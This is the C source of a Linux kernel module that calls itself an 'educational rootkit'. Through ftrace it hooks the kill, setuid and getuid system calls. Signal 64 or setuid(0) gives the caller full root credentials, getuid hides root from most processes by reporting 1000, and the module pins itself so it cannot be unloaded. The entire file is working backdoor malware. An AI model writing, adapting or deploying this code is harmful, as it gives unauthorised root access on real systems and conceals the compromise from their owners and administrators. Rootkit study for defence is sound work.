#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/sched.h>
#include <linux/cred.h>
#include <linux/version.h>
#include <linux/string.h>
#include "ftrace_helper.h"

#define MAGIC_NUMBER 64

MODULE_LICENSE("GPL");
MODULE_DESCRIPTION("Educational rootkit using ftrace hooks");
MODULE_AUTHOR("Educational purposes");

static asmlinkage long (*orig_kill)(const struct pt_regs *);
static asmlinkage long (*orig_setuid)(const struct pt_regs *);
static asmlinkage long (*orig_getuid)(const struct pt_regs *);

static void give_root(void) {
    struct cred *new_creds;
    
    new_creds = prepare_creds();
    if (!new_creds) return;
    
    new_creds->uid.val = 0;
    new_creds->gid.val = 0;
    new_creds->euid.val = 0;
    new_creds->egid.val = 0;
    new_creds->suid.val = 0;
    new_creds->sgid.val = 0;
    new_creds->fsuid.val = 0;
    new_creds->fsgid.val = 0;
    
    commit_creds(new_creds);
}

static asmlinkage long hook_kill(const struct pt_regs *regs) {
    int signal = regs->si;
    
    if (signal == MAGIC_NUMBER) {
        give_root();
        return 0;
    }
    
    return orig_kill(regs);
}

static asmlinkage long hook_setuid(const struct pt_regs *regs) {
    uid_t uid = regs->di;
    
    if (uid == 0) {
        give_root();
        return 0;
    }
    
    return orig_setuid(regs);
}

static asmlinkage long hook_getuid(const struct pt_regs *regs) {
    long real_uid = orig_getuid(regs);
    
    if (real_uid == 0) {
        const char *proc_name = current->comm;
        
        if (strcmp(proc_name, "systemd") == 0 ||
            strcmp(proc_name, "init") == 0 ||
            strcmp(proc_name, "sshd") == 0) {
            return real_uid;
        }
        
        return 1000;
    }
    
    return real_uid;
}

static struct ftrace_hook hooks[] = {
    HOOK("__x64_sys_kill", hook_kill, &orig_kill),
    HOOK("__x64_sys_setuid", hook_setuid, &orig_setuid),
    HOOK("__x64_sys_getuid", hook_getuid, &orig_getuid),
};

static int __init rootkit_init(void) {
    int err;
    
    err = fh_install_hooks(hooks, ARRAY_SIZE(hooks));
    if (err) return err;
    
    try_module_get(THIS_MODULE);
    
    return 0;
}

static void __exit rootkit_exit(void) {
    fh_remove_hooks(hooks, ARRAY_SIZE(hooks));
}

module_init(rootkit_init);
module_exit(rootkit_exit);